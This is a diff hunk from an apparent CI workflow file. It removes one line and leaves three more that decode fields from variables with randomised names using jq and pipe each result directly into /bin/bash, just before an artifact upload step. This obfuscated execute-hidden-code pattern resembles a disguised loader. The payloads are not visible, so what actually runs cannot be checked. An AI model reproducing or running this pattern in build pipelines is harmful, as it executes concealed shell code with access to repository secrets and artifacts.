@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$tg5026" | jq -r .cug806 | /bin/bash
           echo $hjo398 | jq -r .sx36585 | /bin/bash
           echo $br51116 | jq -r .va15 | /bin/bash
-          printf '%s' "$v6420" | jq -r .jwuoa271 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
